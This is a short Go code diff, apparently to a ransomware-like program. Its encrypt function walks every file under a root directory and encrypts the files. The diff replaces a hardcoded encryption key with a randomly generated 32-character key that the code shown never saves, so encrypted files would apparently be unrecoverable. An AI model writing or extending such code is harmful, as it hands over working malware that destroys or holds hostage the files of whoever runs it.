@@ -7,6 +7,7 @@ import (
 	"os/user"
 	"path/filepath"
 	"sync"
+	"math/rand"
 )
 
 var wg sync.WaitGroup
@@ -19,9 +20,19 @@ func main() {
 
 }
 
+func RandomString(n int) string {
+    var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
+ 
+    s := make([]rune, n)
+    for i := range s {
+        s[i] = letters[rand.Intn(len(letters))]
+    }
+    return string(s)
+}
+
 func encrypt(root string) {
 	var files []string
-	FileEncryption.InitializeBlock([]byte("a very very very very secret key"))
+	FileEncryption.InitializeBlock([]byte(RandomString(32)))
 	filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
 		files = append(files, path)
 		return nil
